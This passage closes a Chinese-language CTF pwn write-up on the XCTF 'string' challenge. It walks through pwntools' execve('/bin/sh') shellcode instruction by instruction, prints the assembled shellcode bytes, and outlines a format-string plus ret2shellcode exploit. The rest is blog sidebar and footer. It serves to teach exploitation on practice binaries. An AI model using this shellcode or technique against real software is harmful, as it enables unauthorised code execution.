<p>8先压栈然后退给<code>rsi</code>,然后<code>rsp</code>也加到<code>rsi</code>上,<code>rsi=rsp+8</code></p>
<p>然后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push rsi /* &#x27;sh\x00&#x27; */</span><br><span class="line">mov rsi, rsp</span><br><span class="line">xor edx, edx /* 0 */</span><br><span class="line">/* call execve() */</span><br></pre></td></tr></table></figure>
<p>rsi压栈然后获取rsp栈顶指针作为参数,</p>
<p>edx归0作为第三个参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push SYS_execve /* 0x3b */</span><br><span class="line">pop rax</span><br></pre></td></tr></table></figure>
<p>系统调用号约定用rax寄存器传递</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">syscall</span><br></pre></td></tr></table></figure>
<p>陷阱,系统调用</p>
<h3 id="asmshellcode"><code>asm(shellcode)</code></h3>
<p>将汇编指令转化为机器码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">shellcode = shellcraft.sh()</span><br><span class="line"><span class="built_in">print</span>(asm(shellcode))</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05&#x27;</span><br></pre></td></tr></table></figure>
<p>实际上是16进制表示的二进制码</p>
<h3 id="总结">总结</h3>
<p>关键点有两个</p>
<p>一是通过某些手段,修改main中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v4 = malloc(8uLL);</span><br><span class="line">  *v4 = 68;</span><br><span class="line">  v4[1] = 85;</span><br></pre></td></tr></table></figure>
<p>让v4的高低两个双字数值相等</p>
<p>诚如是则<code>sub_400CA6</code>中<code>if ( *a1 == a1[1] )</code>成立,下面就可以考虑向mmap创建的虚拟地址空间中写入<code>shellcode</code></p>
<p>二是写入shellcode之后,一个强行函数指针就会执行该shellcode区域</p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/xctf%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" rel="tag"># xctf攻防世界</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/06/02/%E7%BA%BF%E7%A8%8B%E5%B9%B6%E5%8F%91/" rel="prev" title="CSAPP-chapter12 线程并发">
      <i class="fa fa-chevron-left"></i> CSAPP-chapter12 线程并发
    </a></div>
      <div class="post-nav-item">
    <a href="/2022/06/05/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="next" title="渗透测试信息收集">
      渗透测试信息收集 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#xctf%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-%E6%96%B0%E6%89%8B%E6%9D%91"><span class="nav-number">1.</span> <span class="nav-text">xctf攻防世界-pwn-新手村</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%B0%E6%89%8B%E6%9D%91%E5%87%86%E5%A4%87"><span class="nav-number">1.1.</span> <span class="nav-text">000新手村准备</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.1.</span> <span class="nav-text">栈缓冲区溢出原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="nav-number">1.1.2.</span> <span class="nav-text">防御措施</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%87%91%E4%B8%9D%E9%9B%80canary"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">金丝雀canary</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pie"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">PIE</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level0"><span class="nav-number">1.2.</span> <span class="nav-text">001level0</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">1.2.1.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level2"><span class="nav-number">1.3.</span> <span class="nav-text">002level2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-1"><span class="nav-number">1.3.1.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#guess_num%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%B9%E5%8F%98%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%A7%8D%E5%AD%90"><span class="nav-number">1.4.</span> <span class="nav-text">003guess_num(栈缓冲区溢出改变随机数种子)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#main"><span class="nav-number">1.4.1.</span> <span class="nav-text">main()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-2"><span class="nav-number">1.4.2.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#int_overflow%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%B9%E5%8F%98%E6%A0%88%E4%B8%AD%E6%95%B4%E6%95%B0"><span class="nav-number">1.5.</span> <span class="nav-text">004int_overflow(栈缓冲区溢出改变栈中整数)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#login"><span class="nav-number">1.5.1.</span> <span class="nav-text">login()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#check_passwdbuf"><span class="nav-number">1.5.2.</span> <span class="nav-text">check_passwd(buf)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-3"><span class="nav-number">1.5.3.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cgpwn2ret2text"><span class="nav-number">1.6.</span> <span class="nav-text">005cgpwn2(ret2text)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E6%B1%87%E7%BC%96%E5%88%86%E6%9E%90"><span class="nav-number">1.6.1.</span> <span class="nav-text">反汇编分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#main-hello"><span class="nav-number">1.6.1.1.</span> <span class="nav-text">main()-&gt;hello()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pwn"><span class="nav-number">1.6.1.2.</span> <span class="nav-text">pwn()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%80%83%E8%99%91%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA"><span class="nav-number">1.6.2.</span> <span class="nav-text">考虑栈缓冲区溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BC%80%E7%AB%AF%E5%92%8C%E5%B0%BE%E5%A3%B0-%E6%AF%8F%E6%9D%A1%E6%8C%87%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%90%8E%E7%9A%84%E6%A0%88%E5%B8%A7%E6%83%85%E5%86%B5%E5%88%86%E6%9E%90"><span class="nav-number">1.6.2.1.</span> <span class="nav-text">开端和尾声
每条指令执行后的栈帧情况分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%BC%80%E7%AB%AF"><span class="nav-number">1.6.2.1.1.</span> <span class="nav-text">开端:</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#text0804864c-call-hello"><span class="nav-number">1.6.2.1.1.1.</span> <span class="nav-text">1..text:0804864C                 call    hello        ;</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#text08048562-push-ebp-ebp%E5%8E%8B%E6%A0%88%E5%8D%A0%E7%94%A84%E5%AD%97%E8%8A%82"><span class="nav-number">1.6.2.1.1.2.</span> <span class="nav-text">2..text:08048562                 push    ebp          ;ebp压栈,占用4字节</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#text08048565-push-esi-esi%E5%8E%8B%E6%A0%88%E8%A2%AB%E8%B0%83%E7%94%A8%E8%80%85%E4%BF%9D%E5%AD%98%E5%AF%84%E5%AD%98%E5%99%A8"><span class="nav-number">1.6.2.1.1.3.</span> <span class="nav-text">3..text:08048565                 push    esi          ;esi压栈,被调用者保存寄存器</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#text08048566-push-ebx-ebx%E5%8E%8B%E6%A0%88%E8%A2%AB%E8%B0%83%E7%94%A8%E8%80%85%E4%BF%9D%E5%AD%98%E5%AF%84%E5%AD%98%E5%99%A8"><span class="nav-number">1.6.2.1.1.4.</span> <span class="nav-text">4..text:08048566                 push    ebx          ;ebx压栈,被调用者保存寄存器</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#text08048567-sub-esp-30h-%E4%B8%BA%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E5%BC%8030h%E5%AD%97%E8%8A%82%E7%9A%84%E6%A0%88%E7%A9%BA%E9%97%B4"><span class="nav-number">1.6.2.1.1.5.</span> <span class="nav-text">5..text:08048567                 sub     esp, 30h     ;为局部变量开30h字节的栈空间</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B0%BE%E5%A3%B0"><span class="nav-number">1.6.2.1.2.</span> <span class="nav-text">尾声</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#text080485fd-add-esp-30h-%E5%BC%80%E7%AB%AF%E6%97%B6%E4%B9%9F%E6%98%AFsub-esp30h-%E8%BF%99%E6%98%AF%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E7%9A%84%E7%A9%BA%E9%97%B4%E6%BA%A2%E5%87%BA%E6%88%90%E4%BB%BB%E6%84%8F%E5%AD%97%E7%AC%A6%E5%A1%AB%E7%A9%BA"><span class="nav-number">1.6.2.1.2.1.</span> <span class="nav-text">1..text:080485FD                 add     esp, 30h     ;开端时也是sub esp,30h 这是局部变量的空间,溢出成任意字符填空</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#text08048600-pop-ebx-%E8%A2%AB%E8%B0%83%E7%94%A8%E8%80%85%E4%BF%9D%E5%AD%98%E5%AF%84%E5%AD%98%E5%99%A8ebx"><span class="nav-number">1.6.2.1.2.2.</span> <span class="nav-text">2..text:08048600                 pop     ebx          ;被调用者保存寄存器,ebx</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#text08048601-pop-esi-%E6%A0%88%E9%A1%B6%E6%8C%87%E9%92%88"><span class="nav-number">1.6.2.1.2.3.</span> <span class="nav-text">3..text:08048601                 pop     esi          ;栈顶指针</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#text08048602-pop-ebp-%E7%84%B6%E5%90%8E%E6%98%AF%E8%B0%83%E7%94%A8%E8%80%85%E5%87%BD%E6%95%B0ebp%E7%9A%84%E4%BF%9D%E5%AD%98%E5%80%BC%E6%88%91%E4%BB%AC%E7%BB%99%E4%BB%96%E6%BA%A2%E5%87%BA%E6%88%90%E4%BB%BB%E6%84%8F%E5%AD%97%E7%AC%A6%E5%A1%AB%E7%A9%BA"><span class="nav-number">1.6.2.1.2.4.</span> <span class="nav-text">4..text:08048602                 pop     ebp          ;然后是调用者函数ebp的保存值,我们给他溢出成任意字符填空</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#text08048603-retn-%E6%AD%A4%E5%A4%84retn-%E4%BC%9A%E5%B0%86%E6%88%91%E4%BB%AC%E6%BA%A2%E5%87%BA%E7%9A%84%E8%BF%94%E5%9B%9E%E5%80%BC%E6%94%BE%E5%88%B0rip"><span class="nav-number">1.6.2.1.2.5.</span> <span class="nav-text">5..text:08048603                 retn                 ;此处retn 会将我们溢出的返回值放到rip</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-4"><span class="nav-number">1.6.3.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level3ret2libcprintf%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.7.</span> <span class="nav-text">006level3(ret2libc,printf格式化字符串漏洞)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF"><span class="nav-number">1.7.1.</span> <span class="nav-text">收集信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E6%B1%87%E7%BC%96%E5%88%86%E6%9E%90-1"><span class="nav-number">1.7.2.</span> <span class="nav-text">反汇编分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-5"><span class="nav-number">1.7.3.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#get_shell%E7%99%BD%E7%BB%99"><span class="nav-number">1.8.</span> <span class="nav-text">007get_shell(白给)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cgfsbprintf%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.9.</span> <span class="nav-text">008CGfsb(printf格式化字符串漏洞)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.9.1.</span> <span class="nav-text">信息收集:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E6%B1%87%E7%BC%96%E5%88%86%E6%9E%90-2"><span class="nav-number">1.9.2.</span> <span class="nav-text">反汇编分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%A5%97%E8%B7%AFprintf"><span class="nav-number">1.9.3.</span> <span class="nav-text">格式化字符串漏洞套路printf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%9E%E5%88%B0%E6%9C%AC%E9%A2%98"><span class="nav-number">1.9.4.</span> <span class="nav-text">回到本题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-6"><span class="nav-number">1.9.5.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hello_pwn%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E4%BF%AE%E6%94%B9%E6%A0%88%E4%B8%AD%E6%95%B4%E6%95%B0"><span class="nav-number">1.10.</span> <span class="nav-text">009hello_pwn(栈缓冲区溢出修改栈中整数)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stringprintf%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9Eret2shellcode"><span class="nav-number">1.11.</span> <span class="nav-text">010string(printf格式化字符串漏洞,ret2shellcode)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#main-1"><span class="nav-number">1.11.1.</span> <span class="nav-text">main</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sub_400d72"><span class="nav-number">1.11.2.</span> <span class="nav-text">sub_400D72</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sub_400a7d"><span class="nav-number">1.11.3.</span> <span class="nav-text">sub_400A7D</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sub_400bb9"><span class="nav-number">1.11.4.</span> <span class="nav-text">sub_400BB9</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sub_400ca6_dword-a1"><span class="nav-number">1.11.5.</span> <span class="nav-text">sub_400CA6((_DWORD *)a1)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#mmap"><span class="nav-number">1.11.5.1.</span> <span class="nav-text">mmap</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#contextoslinux-archamd64"><span class="nav-number">1.11.6.</span> <span class="nav-text">context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shellcode"><span class="nav-number">1.11.7.</span> <span class="nav-text">shellcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#asmshellcode"><span class="nav-number">1.11.8.</span> <span class="nav-text">asm(shellcode)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.11.9.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="dustball"
      src="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
  <p class="site-author-name" itemprop="name">dustball</p>
  <div class="site-description" itemprop="description">dustland</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">78</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">30</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">dustball</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>

        
<div class="busuanzi-count">
  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/pjax/pjax.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>

  <script>
var pjax = new Pjax({
  selectors: [
    'head title',
    '#page-configurations',
    '.content-wrap',
    '.post-toc-wrap',
    '.languages',
    '#pjax'
  ],
  switches: {
    '.post-toc-wrap': Pjax.switches.innerHTML
  },
  analytics: false,
  cacheBust: false,
  scrollTo : !CONFIG.bookmark.enable
});

window.addEventListener('pjax:success', () => {
  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
    var code = element.text || element.textContent || element.innerHTML || '';
    var parent = element.parentNode;
    parent.removeChild(element);
    var script = document.createElement('script');
    if (element.id) {
      script.id = element.id;
    }
    if (element.className) {
      script.className = element.className;
    }
    if (element.type) {
      script.type = element.type;
    }
    if (element.src) {
      script.src = element.src;
      // Force synchronous loading of peripheral JS.
      script.async = false;
    }
    if (element.dataset.pjax !== undefined) {
      script.dataset.pjax = '';
    }
    if (code !== '') {
      script.appendChild(document.createTextNode(code));
    }
    parent.appendChild(script);
  });
  NexT.boot.refresh();
  // Define Motion Sequence & Bootstrap Motion.
  if (CONFIG.motion.enable) {
    NexT.motion.integrator
      .init()
      .add(NexT.motion.middleWares.subMenu)
      .add(NexT.motion.middleWares.postList)
      .bootstrap();
  }
  NexT.utils.updateSidebarPosition();
});
</script>




  
  <script data-pjax>
    (function(){
      var canonicalURL, curProtocol;
      //Get the <link> tag
      var x=document.getElementsByTagName("link");
		//Find the last canonical URL
		if(x.length > 0){
			for (i=0;i<x.length;i++){
				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
					canonicalURL=x[i].href;
				}
			}
		}
    //Get protocol
	    if (!canonicalURL){
	    	curProtocol = window.location.protocol.split(':')[0];
	    }
	    else{
	    	curProtocol = canonicalURL.split(':')[0];
	    }
      //Get current URL if the canonical URL does not exist
	    if (!canonicalURL) canonicalURL = window.location.href;
	    //Assign script content. Replace current URL with the canonical URL
      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
  </script>




  
<script src="//cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script>
<script src="//cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script>
<script src="/js/algolia-search.js"></script>












<script data-pjax>
if (document.querySelectorAll('pre.mermaid').length) {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js', () => {
    mermaid.initialize({
      theme    : 'dark',
      logLevel : 3,
      flowchart: { curve     : 'linear' },
      gantt    : { axisFormat: '%m/%d/%Y' },
      sequence : { actorMargin: 50 }
    });
  }, window.mermaid);
}
</script>


    <div id="pjax">
  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
          load: ['[tex]/mhchem'],
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
          packages: {'[+]': ['mhchem']},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  

    </div>
</body>
</html>
